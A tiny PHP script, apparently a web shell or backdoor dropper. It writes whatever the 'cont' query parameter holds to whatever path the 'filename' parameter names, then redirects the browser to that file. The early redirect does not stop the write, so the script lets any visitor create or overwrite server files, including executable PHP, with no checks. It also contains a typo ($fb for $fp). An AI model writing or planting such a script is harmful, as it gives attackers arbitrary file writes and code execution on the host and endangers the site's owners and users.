<?php

if (isset($_GET['filename']))
    header("Location: rong26.php");

$filename = $_GET['filename'];
$cont =$_GET['cont'];

$fp = fopen($filename,"w+");
fwrite($fp,$cont);
fclose($fb);

header("Location:{$filename}");

